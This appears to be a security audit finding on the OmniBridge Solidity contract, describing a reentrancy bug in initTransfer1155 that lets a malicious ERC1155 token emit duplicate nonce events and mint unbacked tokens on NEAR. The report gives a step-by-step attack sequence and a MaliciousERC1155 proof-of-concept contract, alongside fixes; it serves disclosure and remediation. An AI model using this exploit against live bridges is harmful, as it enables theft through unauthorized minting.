Audit Report

## Title
Reentrancy via Malicious ERC1155 Token Causes Nonce Collision and Unauthorized Minting on NEAR — (`evm/src/omni-bridge/contracts/OmniBridge.sol`)

## Summary

`initTransfer1155` increments `currentOriginNonce` before the external `IERC1155.safeTransferFrom` call but reads the storage variable again after it to populate `initTransferExtension` and the emitted `InitTransfer` event. A malicious ERC1155 token can reenter `initTransfer1155` during `safeTransferFrom`, causing the inner call to overwrite `currentOriginNonce` to N+1 while the outer call also emits with nonce N+1. Both events are emitted with no tokens locked, enabling unauthorized minting on NEAR.

## Finding Description

In `initTransfer1155` (lines 439–490 of `OmniBridge.sol`):

```
Line 448:  currentOriginNonce += 1;                          // nonce becomes N
Lines 458–464: IERC1155(tokenAddress).safeTransferFrom(...); // external call — reentrancy window
Line 471:  initTransferExtension(..., currentOriginNonce, ...); // reads storage AFTER external call
Line 483:  emit BridgeTypes.InitTransfer(..., currentOriginNonce, ...); // reads storage AFTER external call
``` [1](#0-0) 

The nonce is incremented before the external call (correct), but the storage variable is read again after the external call (incorrect). Any reentrant modification of `currentOriginNonce` during the external call is reflected in the event emitted by the outer call.

**Why `onERC1155Received` does not prevent this:**

The guard at lines 522–535 checks `operator != address(this)` and reverts with `ERC1155DirectSendNotAllowed`. However, this callback is only invoked if the ERC1155 token's `safeTransferFrom` implementation calls it. A malicious token can skip calling `onERC1155Received` entirely and return any value — the EVM has no way to enforce that the callback was made. [2](#0-1) 

**Attack execution:**

1. Attacker deploys `MaliciousERC1155` whose `safeTransferFrom` reenters `initTransfer1155` once (with `reentered` flag to stop recursion), then returns without transferring tokens or calling `onERC1155Received`.
2. Attacker calls `logMetadata1155(MaliciousERC1155, tokenId)` — permissionless, no checks on token legitimacy.
3. NEAR registers the token from the `LogMetadata` event.
4. Attacker calls `initTransfer1155(MaliciousERC1155, tokenId, amount, 0, 0, "attacker.near", "")`:
   - Outer call: `currentOriginNonce` → N.
   - `safeTransferFrom` called → malicious token reenters `initTransfer1155`:
     - Inner call: `currentOriginNonce` → N+1.
     - Inner `safeTransferFrom` called → malicious token returns immediately (no reentry, no token transfer).
     - Inner call reads `currentOriginNonce` = N+1, emits `InitTransfer(nonce=N+1)` — **no tokens locked**.
   - Outer `safeTransferFrom` returns (no token transfer).
   - Outer call reads `currentOriginNonce` = N+1 (overwritten by inner call), emits `InitTransfer(nonce=N+1)` — **duplicate, no tokens locked**.
5. NEAR sees two `InitTransfer` events with nonce N+1. It processes the first and mints tokens to `attacker.near`. It rejects the second as a replay. Nonce N is never emitted. No tokens were locked on EVM for either event.

**Note on `msg.value` in inner call:** The inner call originates from the malicious token contract with `msg.value = 0`. Setting `nativeFee = 0` in the inner call makes `extensionValue = 0`, which passes the `initTransferExtension` check at line 503. [3](#0-2) 

This directly violates the documented invariant in `evm/CLAUDE.md`:

> "State before external calls: Always mutate state (e.g. mark nonce used) before any external call" [4](#0-3) 

And the invariant:

> "Event–transfer atomicity: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction." [5](#0-4) 

The same root cause exists in `initTransfer` for ERC20 tokens: `currentOriginNonce` is read from storage after the external `safeTransferFrom` call at lines 415–435. [6](#0-5) 

No `ReentrancyGuardUpgradeable` is imported and no `nonReentrant` modifier is applied to any transfer-initiating function. [7](#0-6) 

## Impact Explanation

An unprivileged attacker can mint an arbitrary quantity of bridged ERC1155 tokens on NEAR without locking any corresponding tokens on the EVM side. This breaks the lock/mint invariant of the bridge: the EVM escrow holds nothing while the NEAR-side supply is inflated. This constitutes unauthorized minting and direct balance manipulation of the bridge's cross-chain accounting — matching the critical impact class of "unauthorized minting" and "escrow mis-accounting / nonce misuse that changes user or protocol balances."

## Likelihood Explanation

The attack requires only: deploying a malicious ERC1155 contract (no special permissions), calling the permissionless `logMetadata1155` to register it, and calling `initTransfer1155`. No admin compromise, no MPC collusion, no front-running, and no victim interaction is required. Any unprivileged bridge user can execute this attack repeatedly.

## Recommendation

1. **Capture the nonce in a local variable before any external call** and use that local variable exclusively in `initTransferExtension` and `emit`:

```solidity
function initTransfer1155(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce; // capture before external call
    ...
    IERC1155(tokenAddress).safeTransferFrom(...);
    ...
    initTransferExtension(..., nonce, ...);
    emit BridgeTypes.InitTransfer(..., nonce, ...);
}
```

Apply the identical fix to `initTransfer` (lines 373–437).

2. **Add `ReentrancyGuardUpgradeable` and the `nonReentrant` modifier** to `initTransfer`, `initTransfer1155`, and `finTransfer` as defense-in-depth, consistent with the documented security model.

## Proof of Concept

```solidity
contract MaliciousERC1155 is ERC1155 {
    OmniBridge bridge;
    bool reentered;

    constructor(address _bridge) ERC1155("") { bridge = OmniBridge(_bridge); }

    function safeTransferFrom(
        address from, address to, uint256 id, uint256 amount, bytes memory
    ) public override {
        if (!reentered) {
            reentered = true;
            // Inner call: increments nonce to N+1, emits InitTransfer(N+1), no tokens locked
            bridge.initTransfer1155(address(this), id, amount, 0, 0, "attacker.near", "");
            reentered = false;
        }
        // Return without transferring tokens or calling onERC1155Received
    }
}

// Test sequence:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(malicious, tokenId)  // permissionless
// 3. bridge.initTransfer1155{value: 0}(malicious, tokenId, 1, 0, 0, "attacker.near", "")
// Expected: two InitTransfer events both with nonce N+1; nonce N never emitted; no tokens locked
// NEAR mints 1 token to attacker.near from the first event; second rejected as replay
```

A Foundry invariant test asserting `for all emitted InitTransfer events, nonce is unique` would catch this. A unit test asserting `balance of bridge increases by amount after initTransfer1155` would also fail, confirming no tokens are locked.

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L1-20)
```text
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.24;

import {AccessControlUpgradeable} from "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Metadata} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import {IERC165} from "@openzeppelin/contracts/utils/introspection/IERC165.sol";
import {ICustomMinter} from "../../common/ICustomMinter.sol";
import {IBridgeToken} from "../../common/IBridgeToken.sol";

import "./BridgeToken.sol";
import "./SelectivePausableUpgradable.sol";
import "../../common/Borsh.sol";
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L415-436)
```text
        initTransferExtension(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            tokenAddress,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L448-489)
```text
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L502-505)
```text
    ) internal virtual {
        if (value != 0) {
            revert InvalidValue();
        }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/CLAUDE.md (L34-34)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
```

**File:** evm/CLAUDE.md (L36-36)
```markdown
- **Event–transfer atomicity**: `InitTransfer` must only be emitted in a code path where tokens have already been burned/locked in the same transaction. If the token transfer reverts or is skipped, the event must not emit — the NEAR side will treat any emitted event as proof that tokens are held
```
